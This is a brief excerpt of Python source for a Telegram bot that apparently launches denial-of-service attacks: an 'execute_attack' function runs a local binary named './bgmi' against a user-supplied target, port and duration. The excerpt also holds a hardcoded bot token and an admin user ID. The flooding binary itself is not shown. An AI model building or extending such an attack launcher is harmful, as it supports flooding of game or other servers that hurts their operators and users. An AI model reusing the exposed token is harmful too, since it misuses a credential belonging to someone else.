...
bot = telebot.TeleBot('7942448263:AAHYUP6Ynb8JntjH3Xbm3y1LE9bEi86dEB8')

# Admin user IDs
ADMIN_IDS = ["1398624971"]
...
async def execute_attack(target, port, duration):
    proc = await asyncio.create_subprocess_exec("./bgmi", target, str(port), str(duration), "200")
